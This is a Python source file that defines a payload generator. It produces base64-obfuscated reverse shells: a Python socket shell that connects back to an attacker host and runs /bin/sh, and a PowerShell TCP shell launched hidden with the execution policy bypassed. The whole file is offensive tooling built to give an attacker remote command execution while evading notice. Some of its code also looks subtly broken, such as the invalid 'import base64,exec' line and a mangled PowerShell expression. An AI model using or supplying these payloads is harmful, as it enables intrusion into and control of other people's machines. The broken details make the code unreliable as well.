import base64
import random
class PayloadGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    def generate_python_payload(self):
        raw_code = f"""import socket,os,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{self.lhost}',{self.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])"""
        encoded = base64.b64encode(raw_code.encode()).decode()
        obfuscated = f"import base64,exec; exec(base64.b64decode('{encoded}').decode())"
        return obfuscated
    def generate_powershell_payload(self):
        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        encoded_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_ps}"
